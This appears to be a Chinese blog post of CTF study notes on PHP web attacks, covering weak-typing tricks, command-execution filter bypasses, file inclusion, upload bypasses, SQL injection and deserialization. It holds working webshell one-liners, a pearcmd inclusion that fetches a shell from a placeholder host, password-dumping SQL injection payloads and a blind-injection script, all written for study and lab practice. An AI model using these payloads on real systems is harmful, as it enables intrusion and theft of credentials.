+++
date = '2025-01-07T21:01:51+08:00'
draft = false
title = 'Web安全'

+++

## php基本特性

弱类型比较

> 1.字符串和数字比较，字符串会被转换成数字
>
> "admin" == 0 true
>
> admin被转换成数字，由于admin是纯字符串，转换失败 int(admin)=0
>
> 2.混合字符串转换成数字，看字符串的第一个
>
> "1admin" == 1  true 
>
> 3.字段串开头以xex开头，x代表数字会被转换成科学计数法
>
> 1e9  1x10⁹
>
> 对输入长度限制，又需要＞=很大的值时使用

```php
if(strlen($money)<=4&&$money>time()&&!is_array($money))
 
        {
            echo $flag;
        }
```

a和b的md5值前两位是==0e开头== xex 变成科学技术法 

==QNKCDZO 和 240610708==

```php
 if (isset($_GET['a'])&&isset($_GET['b'])) {
        $a=$_GET['a'];
        $b=$_GET['b'];
        if($a==$b) 
        {
            echo "<center>Wrong Answer!</center>";
        }
        else {
            if(md5($a)==md5($b)) 
            {
                echo "<center>".$flag."</center>"; 
            }
            else echo "<center>Wrong Answer!</center>";
        }
    }
```

```
常用的MD5加密后以0E开头的有
    QNKCDZO
    240610708
    byGcY
    sonZ7y
    aabg7XSs
    aabC9RqS
    s878926199a
    s155964671a
    s214587387a
    s1091221200a
```

```php
读字符串的函数，使用数组为被读为NULL
<?php
include("flag.php");
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3']) )
{
    $v1=$_GET['v1'];
    $v2=$_GET['v2'];
    $v3=$_GET['v3'];
 
    if($v1!=$v2&&md5($v1)==md5($v2))
    {
        if(!strcmp($v3, $flag))
        {
            echo $flag;
        }
    }
 
}
```

>数组传参?v1[]=1&v2[]=2&v3[]=3

extract — 从数组中读值导出成变量

trim - 去掉首尾空格回车

```php
include("extract_flag.php");
extract($_GET); 
if(isset($aurora))
{ 
    $content=trim(file_get_contents($flag)); 
 
    if($aurora==$content)
     {
        echo $flag; 
    } 
else { echo'Oh.no'; } }?>
```

> aurora&flag  传空值   $aurora为空&$flag为空

strpos函数选择字符串strpos(a,b); 

>在a中寻找b，找到为true，否则为false		能看见%00后面的东西

ereg('^[a-zA-Z0-9]+$',$_GET['password'])

>字符串满足前面的格式返回true，否则为false
>
>'\0'			%00 截断	只能看见%00前面的东西

```php
<?php
include("strpos_flag.php");
if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
		echo 'You password must be alphanumeric';
	else if (strpos ($_GET['password'], '--') !== FALSE)
		die('Flag: ' . $flag);
	else
		echo 'Invalid password';
}
?>
```

数组绕过 password[]=1  为NULL和FALSE做比较

or

password=123%00--





## PHP的代码执行  RCE


Remote Command Exec  

Command指操作系统的命令

system
passthru
exec
shell_exec
popen
pcntl_exec

```
执行运算符 ` （shell_exec） // cat `echo 'xxxx' | base64 -d`
```

绕过方式 

1 替换法  不让用cat 我们用tac
2 通配符  使用* 或者? 匹配敏感字符
3 整天编码解码法   cat `echo 'xxxx' | base64 -d`
4 关键字拼接法    a=c;b=at;c=fla;d=g.php  $a$b $c$d;  //cat flag.php
5 符号过滤突破  空格  可以使用 读取时 使用<> ，使用${IFS}代替空格 ，特殊符号代替空格  %09 %0a %0b %0c
6 环境变量字符串截取法  获取敏感字符     ${变量名:索引:步长}

​									列如：${PHP_EXTRA_CONFIGURE_ARGS:12:1}

Remote Code Exec 

Code指脚本语言(php)的代码

eval
总结：eval(字符串)  表示将字符串按照php的代码执行

call_user_func

call_user_func_array

php动态函数调用

<font color=red>命令执行和代码执行的区别</font>
前者执行操作系统命令 或者执行 脚本语言的代码

函数返回值  函数名字(函数参数);

$ret =  system("calc");

1 危险函数利用

2 过滤了黑名单   

  如果仅仅在代码中过滤了函数名称，那么大概率就等于 没过滤

```php
<?php `$_GET[2]`;?>
<?=`$_GET[2]`;?>
<?=`$_GET[2]`;
<?`$_GET[2]`;
```


无回显情况下的命令执行

通道

数据传输的路径 

shell_exec  

system 相比，没有回显结果 

1. 写入文件、二次返回

2. DNS信道

$flag="fla

JGZsYWc9ImZsYWd7MWE1MzFkNTUtMGRhNS00ODkzRhNS00ODkzLWE5ZWQtZD
ZsYWd7MWE1MzFkNTUtMGRhNS00ODkzRhNS00ODkzLWE5ZWQtZD
RhNS00ODkzLWE5ZWQtZD

3 http信道

4 反弹shell信道

公网IP

5 延时  sleep 3





## 文件包含 

```
nclude和eval的区别
include和eval一样，都不是函数，都是语言结构，无法通过配置文件的数禁用来禁用
include 后面跟 一个站径，表示要执行的php文件的路径 读取路径中文件内容后，然后执行里面的php代码而eval 后面跟 php的代码，表示要执行的php代码
php的常见文件包含函数、语言结构
include 仅仅是包含这个文件，如果文件不存在，那么也没啥大不了，继续执行后面代码
require 必须给老子包含好这个文件，如果没包含好，我就摆烂不执行了，报错
include_once 包合一次 遇到错误继续执行
requine_once 成功包含一次，遇到错误停止
include "flag.php"
文件包含漏洞，是指，通过文件包含时，包含的内容我们用户可控
php伪协议
1 什么是协议?
网络层协议

IP协议
ICMP协议
ARP协议
IGMP协议
应用层协议

http协议
https协议
ftp协议
ssh协议
gopher
qq拉起协议  tencent://qq/go123 交给专门的应用来处理，应用指本地程序

2 协议的格式
协议头://内容
3 php中的协议
file//—访问本地文件系统
http://—访问HTTP(s)网址
ftp:// — 访问 FTP(s) URLs)
php:// —访问各个输入/输出流(I/O system)
zlib://—压缩流
data:// — 数据 (RFC 2397)
glob://—查找匹配的文件路径模式
phar://—PHP归档
ssh2:/l—Secure Shell 2
rar//—RAR
ogg// — 音频流
expect:// —处理交互式的流
常用的协议
file协议
不写协议名称，就默认认为是file协议
相对路径和绝对路径
相对路径转了绝对路径
flag.php index.php /var/www/html include "flag.php" 
include "file:///var/www/htm1/flag.phe"include "flag,php"；
include"../html/flag.php"； “/var/www/html/../html/flag.php”
上层目录特性
1 每个目录都有上层目录
2 根目录的上层目录是根目录本身
php目录整理特性
/var/mw/html/ctfshow/../flag.php
/var/www/html/flag.php

三元表达式
A?B:C
如果A成立，返回B的结果，否则返回C的结果

http协议
配合文件包含，可以读取远程的php代码并在本地执行，实现了最终RCE的效果

ftp协议
默认21端口，进行文件传输的协议

php协议
php://input
php://filter
绕过死亡die
php://filter/wirte=string.rot13/resource=文件名
php的文件上传机制
$_GET $_POST
$_SERVER $_COOKIE
$_SESSION $_FILES
/tmp/phpxxxxxX
/???/????????[@-[]

data协议
data://text/plain,<?php ?>
data://text/plain;base64,<?php ?>
data:,<?php ?>

phar协议

```



include "/var/www/html/flag.php";

一 文件名可控

$file=$_GET['file'];

include $file.".php";  //用php伪协议 ，可以使用data协议


二 文件后缀可控

$file=$_GET['file'];

include "/var/www/html/".$file;  //不能使用伪协议了

/var/www/html/../../../../../flag


高级文件包含

一 nginx日志文件包含

nginx  可以认为它是http的一个服务器软件，提供了http服务 ，默认监听80端口

http://localhost/123.php?a=b

123.php 后缀是否是.php .就进行一次转发，转发到本地的127.0.0.1的9000端口

9000端口，是被另一个服务端软件监听，它提供解析php文件的服务，我们把这个软件，叫做php-fpm

专门解析php后缀的文件，执行里面代码，将执行结果交给nginx,再由nginx返回给http的客户端，这个客户端就是浏览器

http://localhost/123.jpg

123.jpg 非php后缀，那么由自己处理，nginx会找到web目录，读取123.jpg的内容，并返回给浏览器，同时告诉浏览器，我返回的
文件内容是一个jpg图片，你按照图片模式进行渲染，于是，浏览器页面上就能显示出一张图片出来

![](photo/1.png)


日志包含的前提条件

1 有文件名可控的文件包含点
2 有可以访问到的日志路径   默认nginx的日志路径为 /var/log/nginx/access.log

二 临时文件包含

/tmp/php??????

文件包含，能否包含一个 /???/????????[@-[]]

答案是：不行 文件包含，是不支持通配符 

我们明确的，得到这个临时目录下php开头的随机文件名字全称，然后我们就可以正常包含进去

默认情况，生命周期与php脚本一致，也就是说，脚本运行过程中，存在，脚本运行结束了，这个临时文件会被自动删除

突破点：
1 在php脚本运行过程中，包含临时文件
2 在脚本运行过程中，得到完整的临时文件名称 

php配置文件中，默认，每次向浏览器发送内容时，不是一个字符一个字符发送的，它是一块内容一块内容发送的
4096个字符

假设我们能够访问phpinfo的结果  FILES 就会存在tmp_name临时文件名字，读取后可以成功包含


phpinfo_lfi


三  php的session文件包含，upload_progress文件包含


强制文件上传时，通过上传一个固定的表单PHP_SESSION_UPLOAD_PROGRESS ，可以往服务器的session文件内写入我们的指定内容

然后在脚本运行过程中
包含后，可以执行里面的php代码


四 pear文件包含

条件：

1 有文件包含点
2 开启了pear扩展
3 配置文件中register_argc_argv 设置为On,而默认为Off

PEAR扩展

PHP Extension and Application Repository

默认安装位置是  /usr/local/lib/php/  


利用Pear扩展进行文件包含

方法一  远程文件下载

?file=/usr/local/lib/php/pearcmd.php&ctfshow+install+-R+/var/www/html/+http://your-shell.com/shell.php

方法二  生成配置文件，配置项传入我们恶意的php代码的形式

a=b

username=root
man_dir=<?php eval($_POST[1]);?>

ctfshow.php
GET /?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/ctf.php+-d+man_dir=<?eval($_POST[1]);?>+-s+ 


方法三  写配置文件方式

GET /?file=/usr/local/lib/php/pearcmd.php&aaaa+config-create+/var/www/html/<?=`$_POST[1]`;?>+1.php 


五 远程文件包含

通过域名转数字的形式，可以不用.来构造远程文件地址

http://www.msxindl.com/tools/ip/ip_num.asp

?file=http://731540450/1



## php的文件上传


/tmp/php??????

1 php的文件上传绕过 黑名单绕过

后缀替换为空时，我们通过提交  1.pphphp 替换php为空后，得到1.php   成功写入木马

php3 php5 phps phtml

php后缀替换为txt时，我们无法双写绕过，1.pphphp  1.ptxthp

2 php文件上传的00截断

  hello world

  hello空格world\n\00

  123.php  明显不让直接上传

  123.php%00.jpg 那么后台判断的时候，取最后一个点后面的字符作为后缀  jpg  看起来是合法的文件名称

  ./upload/123.php%00.jpg   ->  ./upload/123.php

  00字符截断需要的版本 

  php版本小于5.3.4  而最新的php版本已经达到8.1
  java版本小于7u40,而最新的java版本已经达到20以上

3 iconv字符转换异常后造成了字符截断

php在文件上传场景下的文件名字符集转换时，可能出现截断问题

utf-8字符集  默认的字符编码范围的是0x00-0x7f  

iconv转换的字符不在上面这个范围之内，低版本的php会报异常，报了异常以后，后续字符不再处理

就会造成截断问题

  123.php%df.jpg   123.php

  php版本低于5.4才可以使用  



4 文件后缀是白名单的时候的绕过

  白名单：只准上传这几个后缀   因为匹配的内容少  所以限制的范围就大
  黑名单：不准上传这几个后缀   因为匹配的内容多  所以限制的范围就小 仅限于自己制定的几个，除了这几个，其他都行

  1） web服务器的解析漏洞绕过

  apache 

    a 多后缀解析漏洞  当我们上传apache不认识的后缀时，apahce会继续往前找后缀，找到认识的就
    解析执行
    	  123.txt.ctfshow  123.txt  文本文档形式解析
    
          123.php.ctfshow  123.php  就交给中间件处理php脚本
    
    b ImageMagic组件白名单绕过
    
          目标主机按照了这个漏洞版本的ImageMagic插件 <=3.3.0
          在php.ini中启用了这个插件
          通过了php new Imageick 对象的方式来处理图片时
          且 php版本大于 5.4时  
    
          才可以使用，上传特定的svg图片，来实现组件的缺陷导致任意代码执行



  nginx  基于错误的nginx配置 和 php-fpm配置，当我们访问  123.txt/123.php  
      
         cgi.fix_pathinfo 默认开启  123.txt/123.php  当123.php不存在时，会找/前面的文件进行php解析，这时候，就成功解析了123.txt为php脚本了

  iis   Windows下使用  iis6.0版本中，如果解析的目录名字为 xxx.asp 那么里面的所有文件，都会按照asp来解析 123.txt  WindowsXP  Windows Server 2003 



  高级文件绕过 


  1  .htaccess nginx.htaccess

     php.ini     
    
     虚拟主机时代     一个物理服务器，里面可能存放几十上百个网站   每个网站，一个目录 
    
     A 网站  需要这样的php.ini配置
     B 网站  却需要那样的php.ini配置
     C 网站  又需要另外的php.ini配置 
    
     总的php.ini不动，A B C 3个网站分别在自己目录定义自己的配置，作用域也仅限于自己目录 
    
     自定义配置文件   .htaccess nginx.htaccess
    
     在nginx 下，默认使用.user.ini 配置文件来进行php的配置
    
     使用
    
     auto_append_file=123.txt  来让任意的php文件包含123.txt，执行里面的php代码
    
     疑问：为什么使用.user.ini来自动附加文件的时候，需要一个php文件呢

2 服务端内容检测

不局限检测文件名，还会检测文件的后缀 文件的内容 

<?php system eval $_POST

二分法确定出被检测的关键字，使用替代语法绕过

3 配合伪协议来绕过

auto_append_file=php://input

4 配置日志包含绕过

auto_append_file=/var/log/nginx/access.log


5 上传html来xss 执行跨站脚本


6 getimagesize函数绕过

  getimagesize函数来检测是不是图片，而不采取其他措施的情况下，如果一旦绕过getimagesize函数，就可以实现任意文件上传

  XBM 格式图片 

  #define %s %d 这种形式，就认为时XBM图片的高或者宽

.user.ini

```ini
#define width 100;
#define height 100;
auto_append_file=/var/log/nginx/access.log
```

7 png二次渲染绕过

正常做法：move_uploaded_file 方式移动我们上传的临时文件到上传目录去

二次渲染做法：通过imagepng方法来，来动态依据我们上传的图片的二次生成一个png图片 里面的php代码就会被清洗掉

所以，我们需要使用特殊的方式，来构造我们的图片

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'2.png');  //要修改的图片的路径
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */
?>
```

8 jpg二次渲染绕过

  使用专用图来生成jpg木马，实现经过二次渲染后，我们的恶意代码，依然能够保留在图片中，通过文件包含，执行里面的php代码

9 phar文件上传绕过

需要修改配置项

phar.readonly = Off（默认为On）



## SQL注入

### 什么是sql

sql是一门语言，通过sql语句可以快速实现数据的增上改查 

Create 增
Delete 删
Update 改
Read   查


CURD  就是指对数据的增删改查


什么是数据库

关系型数据库

非关系型数据库


关系型数据库

把所有的数据变为表格存放

常见有

Oracle
Mysql/MariaDB
SQLServer
Access 
Sqlite 

非关系型数据库

nosql数据库

sns 社交软件 web2.0  所有内容 由用户产生   并 由用户消费  

Membase
MongoDB




Mysql/Mariadb 为主


博客系统代码

sql语句

```sql
select id,username,password from user;
update page set title='aaa',content='bbb' where id =1;
delete from page where id =1;
insert into page (title,content) values('aaa','bbb');
```


php语句

```php
$conn = new mysqli($host,$username,$password,$db,$port);
$conn->query();     		#执行sql语句
$result->fetch_all();       #拿到所有结果
$result->fetch_array();     #拿到一行结果
```


sql注入的危害

歪曲了sql语句的执行结果
泄露了数据库中的敏感数据
干扰查询结果，劫持查询的流程，绕过了权限检查
通过文件操作写入恶意代码，可能造成rce

### sql注入的类型

#### 数字型注入和union 注入

http://127.0.0.1/page_detail.php?id=1 union select 1,(select password from user where username='admin'),3 limit 1,2

#### 字符型注入

前面闭合 后面注释  来逃逸出单引号或者双引号
http://127.0.0.1/page_detail.php?id=1' union select 1,(select password from user where username='admin'),3 limit 1,2%23

查所有表 

http://127.0.0.1/page_detail.php?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 limit 1,2%23

查所有列

http://127.0.0.1/page_detail.php?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='user' and table_schema=database()),3 limit 1,2%23

查敏感数据

http://127.0.0.1/page_detail.php?id=1' union select 1,(select group_concat(username,'-',password) from user),3 limit 1,2%23



注释两种形式   #   --空格

#### 类型三：布尔盲注

boolean 盲注

条件：
没有明显的回显点
只有得到两个结果，如果执行正常，页面不报错，执行不正常，页面报错

我们执行了我们自定义的sql语句，如果语句是正确的，或者说，语句内我们的猜测是正确的，就返回正常或者特定页面，否则返回错误页面或者其他特定页面


1 当我们猜对(sql执行正常)情况下，页面没有报错
2 当我们猜错(sql执行不下去)情况下，页面报错

基于上面的原理，我们可以发送大量的请求，来猜测我们需要的数据

```
username=admin&password=admin123
&不编码当做分隔符
&编码后当做数据传入
```

```sql
select id,username,password from user where username='sad' or substr(username,1,1)='a' and id=1#and password='8888';
```

盲注脚本

```python
import requests

url = "http://localhost/day7/login.php"

def check_username(username_length):
    username=""
    sts = "abcdefghijklmnopqrstuvwxyz"
    for i in range(username_length):
            for s in sts:
                data = {
                    "username":f"aa' or substr(username,{i+1},1)='{s}' and id=1;#",
                    "password":"ctf"
                }
                response = requests.post(url=url,data=data)
                print(f"正在测试第{i+1}位是否是"+s)
                if "成功" in response.text:
                    print(f"猜测正确，第{i+1}位是"+s)
                    username = username + s
                    break
    return username

def check_length():
    ret = 0
    for s in range(6):
        data = {
            "username":f"aa' or length(username)={s+1} and id=1;#",
            "password":"ctf"
        }
        response = requests.post(url=url,data=data)
        print(f"正在测试用户名是否是{s+1}位")
        if "成功" in response.text:
            print(f"猜测正确，用户名是{s+1}位")
            ret = s+1
            break
    return ret

if __name__=="__main__":
    username_length = check_length()
    username = check_username(username_length)
    print(username)
```

#### 类型四：报错注入

条件：

1 没有明显的回显点
2 有mysql执行sql语句的报错信息

a. 利用updatexml函数来强制报错，带出我们的查询结果

```sql
username=s'  or updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),1)--+&password=fs
#查询数据库表名
username=s'  or updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='user'),'~'),1)--+&password=fs
-- 查询表中列名
username=s'  or updatexml(1,concat('~',(select group_concat(username,'~',password) from user),'~'),1)--+&password=fs
-- 查数据
#因为一次只能返回32个字符，需要使用substr来依次查看substr(查询的数据,从第几位开始,步长)
username=s'  or updatexml(1,concat('~',(select substr(group_concat(username,'~',password),30,30) from user),'~'),1)--+&password=fs
```

username=admin' or updatexml(1,concat('^',(select group_concat(column_name) from information_schema.columns where table_name='user' and table_schema=database()),'^'),1)%23&password=123123

b. extractvalue 和updatexml 功能一样，也是通过报错带出查询数据用

c. 整数溢出报错   exp  pow cot  

d. 不存在函数报错   select ctfshow();      很鸡肋只能查出数据库

#### 类型五：堆叠注入

我们控制的语句，可以执行多条sql

注意点：
需要后台代码支持多条语句执行，而这个支持，需要不同于上面的代码写法


强网杯  随便注  

通过分号分隔多条sql语句，实现了修改表结构，甚至删除表数据等等结果

如果可以堆叠，大家应该首先考虑  存储过程  set @a='sele';set @b='ct';set @c=@a+@b;

存储过程 类似与 shell的函数  可以自定义函数

#### 类型六：时间盲注

条件：
没有明显的回显点
页面也没有明显的变化，即使sql语句执行不成功

总结：
可以执行sql注入，但是不知道执行结果，也不知道执行了没，甚至不知道报错了没

原理：

猜测某个条件，如果成立，就sleep 几秒  

 select id,username,password from user where username = 'admin' and if((select substr(username,1,1) from user where id = 1)='a',sleep(3),1);


a sleep进行延迟

b benchmark(count,exp)  

如果执行一个比较耗时的表达式，非常多的次数，加起来，就有可能造成延时的效果

c 笛卡尔积延迟法

  select count(*) from user A,user B;
  SELECT count (*) FROM information_schema.columns A,information_schema.columns B,information_schema.tables C;

 select count(*) from information_schema.tables,information_schema.columns b,user as c,user as d,user as e,user as f;

 if(2>1,延迟语句，1)


d get_lock函数延迟法

  select get_lock('a',3);

  条件：针对数据库连接的长连接有效   

  php 一般 解释执行完毕后，就会关闭数据库连接，下次请求的时候再次连接数据库 
  java 维护一个数据库连接池，长时间连接，需要处理请求时，拿出来进行sql查询，查询完后，放回数据库连接池


e rlike
  通过大量的正则匹配来实现延迟

#### 类型七：二次注入

条件：

1 无法直接注入，但是可以把要注入的数据插入数据库中

2 其他地方引用数据库中的数据，拼接sql语句时，默认不再进行过滤，直接拼接，造成曲线控制了sql语句

1 整数型注入/union联合注入
2 字符型注入
3 布尔盲注
4 报错注入
5 堆叠注入
6 时间盲注
7 二次注入


不同注入点的应对技巧

sql语句分为CURD操作

select 注入

1 当我们控制点在where 之后，则尝试 闭合参数引号，有回显就联合注入，有报错，就报错注入等等

2 select title,content from page;

select (select password from user where username='admin') ,content from page;

3 注入点在 group by 或者oder by之后    时间盲注

select title,content from page order by title;

select title,content from page order by title,if(2>1,sleep(3),1);

select * from page order by title,if((select substr(username,1,1) from user where id=1)='a',sleep(3),1);

4 注入点在limit 之后 5.6版本之前  8以后废弃 

select title,content from page limit 1;

select title,content from page limit 1 procedure analyse(updatexml(1,concat("^",(select user()),"^"),1));


包括一些小技巧

1 字符串可以转为16进制来用
select 0x63746673686f77

2 相同或者类似功能的函数相互替换

  substr sustring 

  类似cat 用tac替代绕过检测 

3 mysql 还可以使用into outfile '/var/www/html/1.php' 的形式，从数据读取，转为数据写入，从而实现代码执行
  如果mysql对那个目录有写权限 





## 序列化基础知识引入

### 类与对象


//用户类

```php
//属性和方法的集合
class  user{
    public $username;  //共有属性
    private $password; //私有属性
    protected $userType;
    public static $platform="ctfshow";
//公共方法
	public login(){
    	echo $this->password;
	}
//公共方法
	public logout(){

	}
}
```

类的定义，我们可以认为是设计图


//实例化一个类  从设计图转换为一个可以用的变量，变量类型不再是字符串或者数字，而是一个对象
$u = new user(); 每个对象中，静态属性值，不变

$p = new user();

$u->username;

$p->username;


类和对象的关系，类似于  设计图（蓝图） 与 生成出的产品 之间的关系


属性的权限，可以分为：

1 public 权限 外部可以通过箭头访问到
2 private 权限 内部通过 $this->username 访问到
3 protected 权限 表示 自身及其子类 和父类 能够访问


类的继承

普通用户    vip用户   管理员用户

都属于user类  

```php
class normalUser extends user{
    public $score;
	public function play(){
   		echo  $this->userType;
	}
}

$n = new normalUser();

class vipUser extends user{
    public $score;
}


class adminUser extends user{
    public $score;
}
```




方法的属性修饰符


public 
private
protected

修饰：
静态属性   static 
final属性   final


类的分类

1 普通类 没有任何修饰

```php
class user{
	public function login(){

	}
	public function logout(){

	}
}
```


2 抽象类

```php
abstract class user{
	public function login(){

	}
	public function logout(){

	}
	abstract function play();
}
```
类里面的方法，有些是有详细的实现，有些就只有个方法名字，没具体实现

抽象类 不能被 new 也就是不能被直接 实例化对象

3 接口 interface

为了实现多继承效果

extends user
implements 可以实现多个接口


4 trait

可以认为是代码段 ，方便复制粘贴


5 匿名类


//一次性匿名类的例子
$v->play(new class{
    public $username="我是匿名类";
});


//核心思路 更类似于  伪协议的data伪协议


序列化于反序列化

如果属性权限为private，那么序列化后，存储的属性名字为   %00+类名+%00+属性名


如果属性权限为protected，那么序列化后，存储的属性名字为   %00+*+%00+属性名


序列化是  将 一个对象 变为一个可以传输的字符串  serialize(对象)  返回  序列化后的字符串

反序列化 就是将 一个可以传输的字符串 变为一个 可以调用的对象   unserialize(反序列化后的字符串) 返回 对象



```php
class Animal{
    public $name;
    
	function eat(){
    	echo "i can eat";
	}
	function sleep(){
    	echo "i can sleep";
	}
}
$a = new Animal();
echo serialize($a);
// 对象-> 字符串

//O:6:" ":1:{s:4:"name";N;}

// O 有一个对象
// : 下一句
// 6 名字是6个字符
// : 下一句
//"Animal" 内容是Animal
// : 下一句
// 1 对象有一个属性
// : 下一句
// { 对象属性描述开始
// s 属性是一个字符串 string
// : 下一句
// 4 属性名字是4个字符
// : 下一句
// "name" 属性名字是name
// ; 属性名字描述完了
// N 没有值，值为null
// ; 属性值描述完了
// } 对象属性描述完了

class Animal{
    public $name;
}
```

//结论

//反序列化和类的方法无关，不能把类方法序列化


//反序列化时，php会这么做

// 1 找到反序列化字符串规定的类名字 
// 2 实例化这个类，但是不是调用构造方法
// 3 有了实例化的类对象，对它的属性进行赋值
// 4 执行魔术方法
// 5 返回构造好的对象



1 接口是否可以序列化？            不可以
2 匿名类是否可以序列化？        不可以
3 trait 是否可以序列化？           不可以


魔术方法

总结：
1 魔术方法是一类类的方法
2 会在序列化和反序列化及其他特殊情况下，自动执行

分类：

```
1 __construct 
在实例化一个对象(new)时，会被自动调用
不允许重复声明
可以作为非public权限属性的初始化

2 __sleep 和 __wakeup方法
序列化时自动调用__sleep方法

3 __destruct方法 析构方法
类对象将要销毁，也就是脚本执行完毕后执行清理工作时自动执行
绕过构析方法system('takekill /fi "imagename eq php.exe" /f');

4 __call 和__callstatic
  对象执行类不存在的方法时候，会自动调用__call方法
  直接执行类的不存在的静态方法时，会自动调用__callstatic方法

5 __get __set 和 __isset __unset魔术方法
__get  对不可访问属性或不存在属性 进行访问引用时自动调用
__set 对不可访问属性或不存在属性 进行写入时自动调用

6 __tostring 方法
类的实例 和字符串进行拼接或者作为字符串引用时，会自动调用__tostring方法

7 __invoke方法
当类的实例被作为函数名字执行的时候，会自动调用__invoke方法

8 __set_state 方法
文档中说 执行 var_export时自动调用

9 __debugInfo 方法的属性修饰符
执行var_dump时自动调用

10 __clone方法
当使用clone关键字 ，clone一个对象时，会自动调用
```

### php的反序列化漏洞


1 有反序列化提交的入口

2 被反序列化的类的魔术方法，有可能被利用


1 绕过__wakeup方法

条件：

1 php5至php5.6.25  之间的版本可以绕过
2 php7到php7.0.10 之间的版本可以绕过

绕过方法：

反序列化字符串中表示属性数量的值  大于 大括号内实际属性的数量时 ，wakeup方法会被绕过

2 绕过 +号正则匹配

参数有过滤，不让输入  O:数字  的形式，试图防止反序列化某个对象

O:数字 改为  O:+数字  就可以绕过上面的O:数字 过滤


3 引用绕过相等

使用&符号表示两个变量指向相同的内存引用地址


4 16进制绕过

反序列化后的字符串 不能出现某个关键单词时，可以使用大S绕过

O:8:"backdoor":1:{s:4:"name";s:10:"phpinfo();";}

O:8:"backdoor":1:{S:4:"n\97me";s:10:"phpinfo();";}


$data='O:8:"backdoor":1:{S:4:"n\97me";s:15:"system(\'calc\');";}';


5 exception 绕过

不影响析构方法执行


6 php反序列化字符逃逸

1 可以控制某个类中的属性值
2 间接控制了某个类的反序列化字符串
3 由于存在无脑过滤，字符增减，造成 描述中字符串的长度 和实际的不一致
4 从而能够逃逸出若干个字符，实现字符可控，从而闭合前面的双引号
5 实现反序列化字符串的完全可控

